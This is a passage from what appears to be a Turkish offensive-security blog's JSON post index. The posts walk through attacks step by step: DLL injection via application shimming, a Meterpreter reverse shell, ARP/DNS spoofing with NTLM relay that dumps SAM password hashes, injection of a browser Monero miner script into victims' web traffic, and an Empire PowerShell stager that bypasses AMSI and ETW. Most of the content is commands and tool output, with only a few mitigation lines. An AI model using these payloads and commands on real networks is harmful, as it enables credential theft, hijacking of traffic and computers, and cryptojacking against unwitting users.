r.C:\\Users\\garabet\\Downloads\\bins&gt;whoamiwhoamigarabetpc\\garabetC:\\Users\\garabet\\Downloads\\bins&gt;"
  },
  
  {
    "title": "Application Shimming",
    "url": "/posts/application-shimming/",
    "categories": "persistence",
    "tags": "PE, movement, dll, execution",
    "date": "2023-07-14 00:00:00 +0300",
    





    
    "snippet": "Compatibility Administrator aracı ile yapılır. Gösterilen bir uygulamaya Injectdll yardımcısı ile dll yüklenir. Uygulama çalışırken eklenen dll ile birlikte yürütülür.  Uygulama seçilir  Parameters...",
    "content": "Compatibility Administrator aracı ile yapılır. Gösterilen bir uygulamaya Injectdll yardımcısı ile dll yüklenir. Uygulama çalışırken eklenen dll ile birlikte yürütülür.  Uygulama seçilir  Parameters ile DLL yolu seçilir  Unselect all ile sağdaki liste kaldırılır  Install ile kurulur1337@empire:~$ msfconsole                                                                            ########                  #                      #################            #                   ######################         #                  #########################      #                ############################               ##############################               ###############################              ###############################              ##############################                              #    ########   #                 ##        ###        ####   ##                                      ###   ###                                    ####   ###               ####          ##########   ####               #######################   ####                 ####################   ####                  ##################  ####                    ############      ##                       ########        ###                      #########        #####                    ############      ######                   ########      #########                     #####       ########                       ###       #########                      ######    ############                     #######################                     #   #   ###  #   #   ##                     ########################                      ##     ##   ##     ##                            https://metasploit.com       =[ metasploit v6.3.21-dev                          ]+ -- --=[ 2327 exploits - 1218 auxiliary - 413 post       ]+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]+ -- --=[ 9 evasion                                       ]Metasploit tip: Set the current module's RHOSTS with database values using hosts -R or services -R                                                                                                                                                                               Metasploit Documentation: https://docs.metasploit.com/[*] Starting persistent handler(s)...msf6 &gt; use multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LHOST eth0LHOST =&gt; eth0msf6 exploit(multi/handler) &gt; set LPORT 9999LPORT =&gt; 9999msf6 exploit(multi/handler) &gt; exploit[*] Started reverse TCP handler on 192.168.1.40:9999 [*] Sending stage (175686 bytes) to 192.168.1.7[*] Meterpreter session 1 opened (192.168.1.40:9999 -&gt; 192.168.1.7:54130) at 2023-07-13 18:33:05 -0400meterpreter &gt; shellProcess 16824 created.Channel 1 created.Microsoft Windows [Version 10.0.22621.1928](c) Microsoft Corporation. All rights reserved.C:\\Users\\sesh\\Desktop&gt;whoamiwhoamiempire\\seshC:\\Users\\sesh\\Desktop&gt;"
  },
  
  {
    "title": "ARP & DNS Spoof + Ntlmrelay",
    "url": "/posts/arp-dns-spoof-ntlmrelay/",
    "categories": "internal",
    "tags": "ntlmrelay, relay-based, non-user, DNS, movement, spoof-based, ARP",
    "date": "2023-07-13 00:00:00 +0300",
    





    
    "snippet": "Saldırgan, Arp spoof ile cihazların arp tablosunu değiştirir. Değiştirilen tabloda kendisini router olarak gösterir. Dns spoof ile spesifik A kayıtları spooflanır. karaca.com = 192.168.1.40  olacak...",
    "content": "Saldırgan, Arp spoof ile cihazların arp tablosunu değiştirir. Değiştirilen tabloda kendisini router olarak gösterir. Dns spoof ile spesifik A kayıtları spooflanır. karaca.com = 192.168.1.40  olacak şekilde  mitmf.conf düzenlenir ve ntlmrelay ile ntlmv2 hashler relay edilerek credentiallar dump edilir.  192.168.1.40 saldırgan IP adresi  Tekniğin çalışabilmesi için hedef cihazların DNS ayarlarının otomatikte bulunması gerekmekte. Sonraki aşamalar için gerekli olan ntlmrelay için ise, smb signing false olmalı.  mitmf.conf içeriğine DNS bölümünde A, NS, CNAME ve TXT kayıt türlerine  *.karaca.com = 192.168.1.40  girilir                [[[A]]]     # Queries for IPv4 address records                *.thesprawl.org=192.168.178.27                *.captive.portal=192.168.1.100                *.karaca.com=192.168.1.40                [[[AAAA]]]  # Queries for IPv6 address records                *.thesprawl.org=2001:db8::1                [[[MX]]]    # Queries for mail server records                *.thesprawl.org=mail.fake.com                [[[NS]]]    # Queries for mail server records                *.thesprawl.org=ns.fake.com                *.karaca.com=192.168.1.40                [[[CNAME]]] # Queries for alias records                *.thesprawl.org=www.fake.com                *.karaca.com=192.168.1.40                [[[TXT]]]   # Queries for text records                *.thesprawl.org=fake message                *.karaca.com=192.168.1.40                [[[PTR]]]   # PTR queries                *.2.0.192.in-addr.arpa=fake.com                *.karaca.com=192.168.1.40C:\\Users\\kivi\\nslookup karaca.comServer:    UnKnownAddress:    192.168.1.1Name:      karaca.comAddress:    192.168.1.40mitmf çalıştırılır.(MITMf)root@empire:~/MITMf# python2 mitmf.py --arp --spoof -i eth0 --gateway 192.168.1.1 --targets 192.168.1.37 --dns/root/.virtualenvs/MITMf/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.  from cryptography import utils, x509███╗   ███╗██╗████████╗███╗   ███╗███████╗████╗ ████║██║╚══██╔══╝████╗ ████║██╔════╝██╔████╔██║██║   ██║   ██╔████╔██║█████╗  ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║██╔══╝  ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║██║     ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝     [*] MITMf v0.9.8 - 'The Dark Side'||_ Net-Creds v1.0 online|_ Spoof v0.6|  |_ DNS spoofing enabled|  |_ ARP spoofing enabled|_ Sergio-Proxy v0.2.1 online|_ SSLstrip v0.9 by Moxie Marlinspike online||_ MITMf-API online * Serving Flask app \"core.mitmfapi\" (lazy loading) * Environment: production   WARNING: This is a development server. Do not use it in a production deployment.   Use a production WSGI server instead. * Debug mode: off * Running on http://127.0.0.1:9999/ (Press CTRL+C to quit)Error starting HTTP server: [Errno 98] Address already in use|_ HTTP server online|_ DNSChef v0.4 onlineError starting SMB server: [Errno 98] Address already in use|_ SMB server online2023-07-13 06:39:09 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:39:09 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:39:17 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:39:21 192.168.1.37 [type:Windows-Update-Agent-10 os:Windows] download.windowsupdate.com2023-07-13 06:39:30 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:39:30 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:39:45 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:39:50 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:40:10 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:40:10 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:40:26 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:40:30 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:40:31 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:40:31 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:40:31 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:40:32 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:40:32 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:40:33 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:40:43 192.168.1.37 [DNS] Cooking the response of type 'A' for karaca.com to 192.168.1.402023-07-13 06:40:54 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:40:54 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:41:20 192.168.1.37 [type:Windows-Update-Agent-10 os:Windows] download.windowsupdate.com2023-07-13 06:41:48 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:42:10 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:42:10 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:43:20 192.168.1.37 [type:Windows-Update-Agent-10 os:Windows] download.windowsupdate.com2023-07-13 06:45:28 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com2023-07-13 06:48:53 192.168.1.37 [type:Other-Other os:Other] au.download.windowsupdate.com192.168.1.37 üzerinden ARP tablosunun değiştiği kontrol edilir, gateway olan 192.168.1.1, 192.168.1.40 ile ayni mac adresine sahipC:\\Users\\kivi\\arp -aInterface: 192.168.1.37 --- 0x3  Internet Address      Physical Address      Type  192.168.1.1           08-00-97-13-0c-bc     dynamic  192.168.1.40          08-00-97-13-0c-bc     dynamicRelay yapılacak sistemin smb signing durumu kontrol edilir1337@empire:~$ crackmapexec smb 192.168.1.27SMB         192.168.1.27    445    CLIENT2          [*] Windows 10.0 Build 22621 x64 (name:CLIENT2) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)ntlmrelayx aktif edilir1337@empire:~$ ntlmrelayx.py -t smb://192.168.1.27 -smb2support               Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra[*] Protocol Client DCSYNC loaded..[*] Protocol Client RPC loaded..[*] Protocol Client IMAP loaded..[*] Protocol Client IMAPS loaded..[*] Protocol Client MSSQL loaded..[*] Protocol Client LDAPS loaded..[*] Protocol Client LDAP loaded..[*] Protocol Client SMB loaded..[*] Protocol Client HTTPS loaded..[*] Protocol Client HTTP loaded..[*] Protocol Client SMTP loaded..[*] Running in relay mode to single host[*] Setting up SMB Server[*] Setting up HTTP Server on port 80[*] Setting up WCF Server[*] Setting up RAW Server on port 6666[*] Servers started, waiting for connections[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] SMBD-Thread-6 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] SMBD-Thread-7 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] SMBD-Thread-8 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] SMBD-Thread-9 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] SMBD-Thread-10 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] SMBD-Thread-11 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] SMBD-Thread-12 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] SMBD-Thread-13 (process_request_thread): Received connection from 192.168.1.37, attacking target smb://192.168.1.27[*] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO SUCCEED[*] Service RemoteRegistry is in stopped state[*] Service RemoteRegistry is disabled, enabling it[*] Starting service RemoteRegistry[*] Target system bootKey: 0x2c72c82e278190c204b68f539d064886[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:3bf95c84497ac1c5123462331fb121:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d11235635236237e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d1123512451239d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:03e09c2f3e08dd125643532db12a:::client:1001:aad3b435b51404eeaad3b435b51404ee:d1f350470cc39eb1231543623411531d:::test:1002:aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d7123454632143d5f:::[*] Done dumping SAM hashes for host: 192.168.1.27[*] Stopping service RemoteRegistry[*] Restoring the disabled state for service RemoteRegistry"
  },
  
  {
    "title": "Enterprise Networklerde Coin Mining",
    "url": "/posts/enterprise-networklerde-coin-mining/",
    "categories": "internal, attacks, monero, coin, XMR, mining, mitigate",
    "tags": "ARP, non-user, spoof-based",
    "date": "2023-07-12 00:00:00 +0300",
    





    
    "snippet": "Temelde ARP Spoof ile gerçekleşir. Saldırgan yerel ağda arp spoof başlatır. Saldırı sonucunda kendi mac adresi kurbanlar tarafından bilinir. Kendi vermiş olduğu javascript dosyasını kurban browserl...",
    "content": "Temelde ARP Spoof ile gerçekleşir. Saldırgan yerel ağda arp spoof başlatır. Saldırı sonucunda kendi mac adresi kurbanlar tarafından bilinir. Kendi vermiş olduğu javascript dosyasını kurban browserlar çalıştırır.&lt;script src=\"https://monerominer.rocks/miner-mmr/webmnr.min.js\"&gt;&lt;/script&gt;&lt;script&gt;    server = \"wss://f.xmrminingproxy.com:8181\";    var pool = \"moneroocean.stream\";    var walletAddress = \"45AThjisE7Z9JScvAMajRgHcFiWw13A59LU4spf8oMXQQUb5AXhd14EBdZCbzr6Yq6jftCHzcYAKq9ekWKXhJ8J4LbGkNEZ\";    var workerId = \"zedeleyici\"    var threads = -1;    var password = \"x\";    startMining(pool, walletAddress, workerId, threads, password);    throttleMiner = 20;&lt;/script&gt;  Bu dosya kurbanlara iletilecek olan miner dosyası. walletAddress senin monero wallet ID olmalı1337@empire:~$ sudo bettercap -X -S ARP --proxy --proxy-module injectjs --js-file miner.js --target 192.168.0.0/16    _          _   _| |__   ___| |_| |_ ___ _ __ ___ __ _ _ __                                                                                                                                                                                                  | '_ \\ / _ \\ __| __/ _ \\ '__/ __/ _` | '_ \\                                                                                                                                                                                                 | |_) |  __/ |_| ||  __/ | | (_| (_| | |_) |                                                                                                                                                                                                |_.__/ \\___|\\__|\\__\\___|_|  \\___\\__,_| .__/                                                                                                                                                                                                                                      |_| v1.6.2                                                                                                                                                                                             http://bettercap.org/                                                                                                                                                                                                                       [I] Starting [ spoofing:✔ discovery:✘ sniffer:✔ tcp-proxy:✘ udp-proxy:✘ http-proxy:✔ https-proxy:✘ sslstrip:✔ http-server:✘ dns-server:✔ ] ...[I] Found hostname 192 for address 192.168.1.7[I] [eth0] 192.168.1.40 : 08:31:27:31:31:31 / eth0 ( PCS Systemtechnik GmbH )[I] Found hostname hgw for address 192.168.1.1[I] [GATEWAY] 192.168.1.1 : A8:31:84:EA:31:31 / hgw ( ??? )[W] WARNING: Both HTTP transparent proxy and URL parser are enabled, you're gonna see duplicated logs.[I] [DNS] Starting on 192.168.1.40:5300 ...[I] [TARGET] 192.168.1.7 : 3C:31:3F:82:31:6D / 192 ( ??? )[I] [HTTP] Proxy starting on 192.168.1.40:8080 ...[192/192.168.1.7 &gt; 104.18.1.245:https] [HTTPS] https://void.steelseries.com/[192/192.168.1.7 &gt; 44.240.80.176:https] [HTTPS] https://api.segment.io/[192/192.168.1.7 &gt; 111.13.49.147:http] [GET] http://chinadaily.com.cn/[192/192.168.1.7] GET http://chinadaily.com.cn/ ( text/html ) [301][I] [INJECTJS] Injecting javascript file into http://chinadaily.com.cn/[192/192.168.1.7 &gt; 199.190.46.232:http] [GET] http://www.chinadaily.com.cn/[192/192.168.1.7] GET http://www.chinadaily.com.cn/ ( text/html ) [200][I] [SSLSTRIP 192.168.1.7] Stripping 15 HTTPS links inside 'http://www.chinadaily.com.cn/'.[192/192.168.1.7 &gt; 44.227.198.172:https] [HTTPS] https://profile.accounts.firefox.com/[192/192.168.1.7 &gt; 40.85.112.191:http] [GET] http://youronlinechoices.com/[192/192.168.1.7] GET http://youronlinechoices.com/ ( text/html ) [301][192/192.168.1.7] GET https://youronlinechoices.com/ ( text/html ) [301][192/192.168.1.7] GET https://youronlinechoices.com/ ( text/html ) [301][192/192.168.1.7] GET https://youronlinechoices.com/ ( text/html ) [301][I] [SSLSTRIP 192.168.1.7] Detected HTTPS redirect loop for 'youronlinechoices.com'.[I] [INJECTJS] Injecting javascript file into https://youronlinechoices.com/[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.youronlinechoices.com', sending spoofed reply 40.85.112.191 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.youronlinechoices.com', sending spoofed reply 40.85.112.191 ...[192/192.168.1.7 &gt; 40.85.112.191:http] [GET] http://wwwww.youronlinechoices.com/[192/192.168.1.7 &gt; 93.184.216.34:http] [GET] http://example.com/[192/192.168.1.7] GET https://www.youronlinechoices.com/ ( text/html ) [200][I] [SSLSTRIP 192.168.1.7] Stripping 1 HTTPS link inside 'https://www.youronlinechoices.com/'.[I] [INJECTJS] Injecting javascript file into https://www.youronlinechoices.com/[192/192.168.1.7] GET http://example.com/ ( text/html ) [200][I] [SSLSTRIP 192.168.1.7] Stripping 1 HTTPS link inside 'http://example.com/'.[192/192.168.1.7] GET https://www.youronlinechoices.com/css/_style.css ( text/css ) [200][192/192.168.1.7] GET https://www.youronlinechoices.com/javascript/js.js ( application/javascript ) [200][192/192.168.1.7] GET https://www.youronlinechoices.com/css/_base.css ( text/css ) [200][192/192.168.1.7] GET https://www.youronlinechoices.com/javascript/hashslider.js ( application/javascript ) [200][192/192.168.1.7] GET https://www.youronlinechoices.com/javascript/jquery-1.7.1.min.js ( application/javascript ) [200][192/192.168.1.7] GET https://www.youronlinechoices.com/wp-content/plugins/optout/js/optout_testpage.js ( application/javascript ) [200][I] [SSLSTRIP 192.168.1.7] Stripping 1 HTTPS link inside 'https://www.youronlinechoices.com/wp-content/plugin...'.[I] [INJECTJS] Injecting javascript file into http://example.com/[192/192.168.1.7 &gt; 93.184.216.34:http] [GET] http://example.com/favicon.ico[192/192.168.1.7 &gt; 40.85.112.191:http] [GET] http://wwwww.youronlinechoices.com/favicon.ico[192/192.168.1.7] GET http://example.com/favicon.ico ( text/html ) [404][I] [SSLSTRIP 192.168.1.7] Stripping 1 HTTPS link inside 'http://example.com/favicon.ico'.[I] [INJECTJS] Injecting javascript file into http://example.com/favicon.ico[192/192.168.1.7 &gt; 195.175.180.217:http] [GET] http://clientconfig.akamai.steamstatic.com/appinfo/714010/sha/2431ab891baaf490c80211d.txt.gz[192/192.168.1.7 &gt; 195.175.180.217:http] [GET] http://clientconfig.akamai.steamstatic.com/appinfo/271590/sha/86d06f893d19ad887c5ab670cff.txt.gz[192/192.168.1.7] GET http://clientconfig.akamai.steamstatic.com/appinfo/271590/sha/86d06f89304b4c6f7c5ab670cff.txt.gz ( application/gzip ) [200][192/192.168.1.7] GET http://clientconfig.akamai.steamstatic.com/appinfo/714010/sha/2431ab891ba4a29af490c80211d.txt.gz ( application/gzip ) [200][192/192.168.1.7 &gt; 93.184.216.34:http] [GET] http://example.com/[192/192.168.1.7] GET http://example.com/ ( text/html ) [200][I] [SSLSTRIP 192.168.1.7] Stripping 1 HTTPS link inside 'http://example.com/'.[I] [INJECTJS] Injecting javascript file into http://example.com/[192/192.168.1.7 &gt; 172.67.38.108:http] [GET] http://axieinfinity.com/[192/192.168.1.7] GET https://axieinfinity.com/ ( text/html ) [200][I] [SSLSTRIP 192.168.1.7] Stripping 4 HTTPS links inside 'https://axieinfinity.com/'.[I] [INJECTJS] Injecting javascript file into https://axieinfinity.com/[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.fonts.googleapis.com', sending spoofed reply 142.251.140.10 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.cdnjs.cloudflare.com', sending spoofed reply 104.17.24.14 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.cdnjs.cloudflare.com', sending spoofed reply 104.17.24.14 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.fonts.googleapis.com', sending spoofed reply 142.251.140.10 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.fonts.googleapis.com', sending spoofed reply 142.251.140.10 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.fonts.googleapis.com', sending spoofed reply 142.251.140.10 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.cdnjs.cloudflare.com', sending spoofed reply 104.17.24.14 ...[192/192.168.1.7 &gt; 142.251.140.10:http] [GET] http://wwwww.fonts.googleapis.com/css2?family=Roboto+Slab:wght@500;700;800&amp;family=Rowdies:wght@400;700&amp;display=swap[192/192.168.1.7 &gt; 216.58.212.10:https] [HTTPS] https://safebrowsing.googleapis.com/[192/192.168.1.7 &gt; 104.17.24.14:https] [HTTPS] https://wwwww.cdnjs.cloudflare.com/[192/192.168.1.7] GET https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@500;700;800&amp;family=Rowdies:wght@400;700&amp;display=swap ( text/css ) [200][I] [SSLSTRIP 192.168.1.7] Stripping 1 HTTPS link inside 'https://fonts.googleapis.com/css2?family=Roboto+Sla...'.[192/192.168.1.7] GET https://axieinfinity.com/static/css/main.4b281a92.css ( text/css ) [200][192/192.168.1.7] GET https://axieinfinity.com/static/js/main.31c21e10.js ( application/javascript ) [200][I] [SSLSTRIP 192.168.1.7] Stripping 40 HTTPS links inside 'https://axieinfinity.com/static/js/main.31c21e10.js...'.[192/192.168.1.7 &gt; 172.67.38.108:http] [GET] http://axieinfinity.com/favicon.ico[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.fonts.gstatic.com', sending spoofed reply 172.217.169.163 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.graphql-gateway.axieinfinity.com', sending spoofed reply 104.22.39.116 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.fonts.gstatic.com', sending spoofed reply 172.217.169.163 ...[I] [192.168.1.7 &gt; DNS] Received request for 'wwwww.graphql-gateway.axieinfinity.com', sending spoofed reply 104.22.39.116 ...SonuçlarNasıl önlenir?  HttpsEverywhere  NoScript  Switch Konfigürasyonları"
  },
  
  {
    "title": "COM Objects ve Living off the Land",
    "url": "/posts/com-objects-ve-living-off-the-land/",
    "categories": "persistence",
    "tags": "living-off-the-land, COM, DCOM, execution, movement",
    "date": "2023-07-12 00:00:00 +0300",
    





    
    "snippet": "  COM, kısaca binary interface olarak nitelendirilir. Yani çalıştırılabilir bir dosyanın, ya da bir ürünün geliştirme aşamasında kullanımını ve yeteneklerini genişletmek için çeşitli fonksiyonlar i...",
    "content": "  COM, kısaca binary interface olarak nitelendirilir. Yani çalıştırılabilir bir dosyanın, ya da bir ürünün geliştirme aşamasında kullanımını ve yeteneklerini genişletmek için çeşitli fonksiyonlar ile donatılmasıdır. Bu işlemleri yapabilmek için objeler geliştirilir ve bu objeler çeşitli amaçlar için kullanılabilir.Outlook uygulaması aktif edilirPS C:\\Windows\\system32&gt; $com = [Type]::GetTypeFromProgID('Outlook.Application','192.168.1.43')PS C:\\Windows\\system32&gt; $object = [System.Activator]::CreateInstance($com)Outlook uygulamasında Create geçen tüm metotlar listelenirPS C:\\Windows\\system32&gt; $object | gm *Create*   TypeName: Microsoft.Office.Interop.Outlook.ApplicationClassName                   MemberType Definition----                   ---------- ----------CreateItem             Method     System.Object CreateItem(Microsoft.Office.Interop.Outlook.OlItemType ItemType), Sy...CreateItemFromTemplate Method     System.Object CreateItemFromTemplate(string TemplatePath, System.Object InFolder),...CreateObject           Method     System.Object CreateObject(string ObjectName), System.Object _Application.CreateOb...CreateObjRef           Method     System.Runtime.Remoting.ObjRef CreateObjRef(type requestedType)CreateObject metodu kullanılacak. Bu metot kullanılarak outlook.application üzerinden empire shell  elde edilecek. Bunu yapabilmek için living off the land kullanımı oldukça yaygındır.  Living off the Land, Hâli hazırda bir sistemin içerisinde bulunan ve saldırgan tarafından da çalıştırılmaya müsait olan uygulamalardır. Uygulama olağan halinde zararlı değilken, saldırgan tarafından başka bir bakış açısı ile zararlı işlemler yapabilecek hale gelebilir.Empire konfigüre edilir(Empire: uselistener/http) &gt; set Name dllhijackerINFO: Set Name to dllhijacker (Empire: uselistener/http) &gt; set Host 192.168.1.26INFO: Set Host to 192.168.1.26 (Empire: uselistener/http) &gt; set Port 9929INFO: Set Port to 9929 (Empire: uselistener/http) &gt; execute[+] Listener dllhijacker successfully started(Empire: uselistener/http) &gt; back(Empire) &gt; usestager multi_launcher id           multi_launcher                                         authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y  description  Generates a one-liner stage0 launcher for Empire.     ┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐│ Name             │ Value              │ Required │ Description                         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Listener         │                    │ True     │ Listener to generate stager for.    │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Language         │ powershell         │ True     │ Language of the stager to generate. │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ StagerRetries    │ 0                  │ False    │ Times for the stager to retry       ││                  │                    │          │ connecting.                         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ OutFile          │                    │ False    │ Filename that should be used for    ││                  │                    │          │ the generated output.               │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Base64           │ True               │ True     │ Switch. Base64 encode the output.   │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      ││                  │                    │          │ powershell code, uses the           ││                  │                    │          │ ObfuscateCommand for obfuscation    ││                  │                    │          │ types. For powershell only.         │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ ObfuscateCommand │ Token\\All\\1        │ False    │ The Invoke-Obfuscation command to   ││                  │                    │          │ use. Only used if Obfuscate switch  ││                  │                    │          │ is True. For powershell only.       │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ SafeChecks       │ True               │ True     │ Switch. Checks for LittleSnitch or  ││                  │                    │          │ a SandBox, exit the staging process ││                  │                    │          │ if true. Defaults to True.          │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ UserAgent        │ default            │ False    │ User-agent string to use for the    ││                  │                    │          │ staging request (default, none, or  ││                  │                    │          │ other).                             │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Proxy            │ default            │ False    │ Proxy to use for request (default,  ││                  │                    │          │ none, or other).                    │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ ProxyCreds       │ default            │ False    │ Proxy credentials                   ││                  │                    │          │ ([domain\\]username:password) to use ││                  │                    │          │ for request (default, none, or      ││                  │                    │          │ other).                             │├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  ││                  │                    │          │ to be prepended to the launcher     │└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘(Empire: usestager/multi_launcher) &gt; set Listener dllhijackerINFO: Set Listener to dllhijacker (Empire: usestager/multi_launcher) &gt; executeINFO: Stager copied to clipboard powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8A